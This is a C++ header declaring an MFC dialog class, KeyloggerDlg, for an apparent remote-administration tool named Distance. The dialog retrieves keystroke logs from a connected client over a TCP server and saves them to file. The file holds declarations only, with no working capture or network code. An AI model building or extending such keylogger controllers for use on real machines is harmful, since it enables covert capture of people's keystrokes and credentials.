//------------------------------------------------------------------------------
// ╔═══╗╔══╗╔═══╗╔════╗╔═══╗╔═╗─╔╗╔═══╗╔═══╗
// ╚╗╔╗║╚╣─╝║╔═╗║║╔╗╔╗║║╔═╗║║║╚╗║║║╔═╗║║╔══╝
// ─║║║║─║║─║╚══╗╚╝║║╚╝║║─║║║╔╗╚╝║║║─╚╝║╚══╗
// ─║║║║─║║─╚══╗║──║║──║╚═╝║║║╚╗║║║║─╔╗║╔══╝
// ╔╝╚╝║╔╣─╗║╚═╝║──║║──║╔═╗║║║─║║║║╚═╝║║╚══╗
// ╚═══╝╚══╝╚═══╝──╚╝──╚╝─╚╝╚╝─╚═╝╚═══╝╚═══╝
// 
// Copyright Ⓒ 0xlay. All rights reserved.
// 
// This source file is licensed under the terms of MIT license.
// For details, please read the LICENSE file.
// 
// File: KeyloggerDlg.hpp
// 
// Creator: 0xlay
// 
// Environment: User mode only
//
// Module: DistanceApp.exe
//
//------------------------------------------------------------------------------

#pragma once


namespace Distance
{

    class KeyloggerDlg : public CDialogEx
    {
        DECLARE_DYNAMIC(KeyloggerDlg)

    public:
        KeyloggerDlg(std::shared_ptr<Distance::Network::DefaultTcpServer> server,
                     size_t clientID,
                     CWnd* pParent = nullptr);
        virtual ~KeyloggerDlg();

        // Dialog Data
#ifdef AFX_DESIGN_TIME
        enum { IDD = IDD_KEYLOGGER_DIALOG };
#endif

    protected:
        void DoDataExchange(CDataExchange* pDX) override; // DDX/DDV support

        DECLARE_MESSAGE_MAP()
    public:
        afx_msg void OnBnClickedUpdate();
        afx_msg void OnBnClickedSave();
        afx_msg void OnBnClickedSaveAs();

    private:
        Network::Message message_;
        std::shared_ptr<Network::DefaultTcpServer> server_;
        size_t clientID_;
        CEdit edit_;
        std::wstring log_;
        std::wstring fileName_;
    };

} // Distance